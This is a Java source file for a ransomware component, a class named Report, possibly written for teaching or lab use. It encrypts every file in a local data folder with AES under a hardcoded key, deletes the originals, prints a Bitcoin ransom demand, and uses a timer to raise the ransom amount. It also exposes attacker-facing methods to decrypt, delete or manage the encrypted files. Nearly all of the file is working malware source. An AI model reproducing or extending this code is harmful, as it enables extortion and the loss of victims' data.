import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PublicKey;
import java.util.Base64;
import java.util.Timer;

public class Report {
    private static final Report instance = new Report();
    private static PublicKey publickey;
    public Port port;
    Timer timerHelper;
    private AESUtils aesUtils;
    private File dataFolder;
    private File encryptedDataFolder;
    private S03_TimerTask timerTask;

    public Report() {
        this.port = new Port();
        this.aesUtils = new AESUtils("IamADamnGoodKeyword123");
        this.dataFolder = new File("data");
        this.timerHelper = new Timer();
        this.timerTask = new S03_TimerTask(this);
        //Create Folder for encrypted data
        this.encryptedDataFolder = new File("encryptedDataFolder");
        if (!this.encryptedDataFolder.exists()) {
            try {
                Files.createDirectory(Paths.get("encryptedDataFolder"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static Report getInstance() {
        return instance;
    }

    public static void showReceiver() {
        System.out.println("\n---------------------------------");
        System.out.println("Please transfer the BTC to the wallet with the address: " + Base64.getEncoder().encodeToString(publickey.getEncoded()));
        System.out.println("---------------------------------");
    }

    private String getPublicKey() {
        return Base64.getEncoder().encodeToString(publickey.getEncoded());
    }

    public static void setPublicKey(PublicKey publicKeyAttacker) {
        publickey = publicKeyAttacker;
    }

    private void encryptFile(File inFile) {
        byte[] encryptedBytes;
        String fileSeparator = FileSystems.getDefault().getSeparator();
        File outFile = new File(encryptedDataFolder + fileSeparator + inFile.getName() + ".mvg");
        try {
            OutputStream outputStream = new FileOutputStream(outFile);
            byte[] fileByteArray = Files.readAllBytes(inFile.toPath());
            encryptedBytes = aesUtils.encrypt(fileByteArray);
            outputStream.write(encryptedBytes);
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void decryptFile(File inFile) {
        byte[] decryptedBytes;
        String fileSeparator = FileSystems.getDefault().getSeparator();
        File outFile = new File(dataFolder + fileSeparator + inFile.getName().substring(0, inFile.getName().length() - 4));
        try {
            OutputStream outputStream = new FileOutputStream(outFile);
            byte[] fileByteArray = Files.readAllBytes(inFile.toPath());
            decryptedBytes = aesUtils.decrypt(fileByteArray);
            outputStream.write(decryptedBytes);
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void encryptDataFolder() {
        timerHelper.schedule(timerTask, 60 * 1000, 60 * 1000);
        File[] files = dataFolder.listFiles();
        if (files != null) {
            for (File file : files) {
                encryptFile(file);
                file.delete();
            }
        }
        System.out.println("\n---------------------------------");
        System.out.println("„Oops, your files have been encrypted. With a payment of 0.02755 BTC all\n" +
                "files will be decrypted.");
        System.out.println("---------------------------------");
    }


    private void decryptFolder() {
        if (encryptedDataFolder.exists()) {
            timerHelper.cancel();
            File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
            if (files != null) {
                for (File file : files) {
                    decryptFile(file);
                    file.delete();
                }
            }
            encryptedDataFolder.delete();
        }
    }

    private void deleteFolder() {
        if (encryptedDataFolder.exists()) {
            timerHelper.cancel();
            File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
            if (files != null) {
                for (File file : files) {
                    file.delete();
                }
            }
            encryptedDataFolder.delete();
        }
    }

    public float getRansomAmount() {
        return timerTask.getRansomAmount();
    }

    private float updateRansomAmount(float alreadyPayed) {
        return timerTask.updateRansomAmount(alreadyPayed);
    }


    public class Port implements IReport {

        public void encrypt() {
            encryptDataFolder();
        }

        public void decrypt() {
            decryptFolder();
        }

        public void deleteFolderAttacker() {
            deleteFolder();
        }

        public void showReceiverAttacker() {
            showReceiver();
        }

        public String getPublicKeyAttacker() {
            return getPublicKey();
        }

        public void setPublicKeyAttacker(PublicKey publicKeyAttacker) {
            setPublicKey(publicKeyAttacker);
        }

        public float getRansomAmountAttacker() {
            return getRansomAmount();
        }

        public float updateRansomAmountAttacker(float alreadyPayed) {
            return updateRansomAmount(alreadyPayed);
        }
    }


}
